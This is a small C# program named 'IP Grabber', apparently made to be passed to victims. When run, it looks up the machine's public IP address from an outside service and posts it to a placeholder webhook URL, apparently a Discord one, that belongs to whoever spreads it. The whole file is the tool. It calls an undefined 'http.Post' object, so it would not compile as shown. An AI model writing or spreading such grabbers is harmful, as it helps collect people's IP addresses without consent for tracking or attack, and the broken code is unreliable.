using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Collections.Specialized;

namespace IP_Grabber
{
    class Program
    {
        static void Main(string[] args)
        {  
            //IP Grabber by BHTelecom#6941/FarukDaKing in 1 Minute
            var send = $"{getIP()}";
            sendWebHook("YOUR WEBHOOK", $"IP: {send}", "IP Grabber");
        }

        public static void sendWebHook(string URL, string msg, string username)
        {
            http.Post(URL, new NameValueCollection()
            {
                { "username", username },
                { "content", msg }
            });
        }

        static string getIP()
        {
            using (WebClient webClient = new WebClient())
            {
                return webClient.DownloadString("http://wtfismyip.com/text");
            }
        }
    }
}
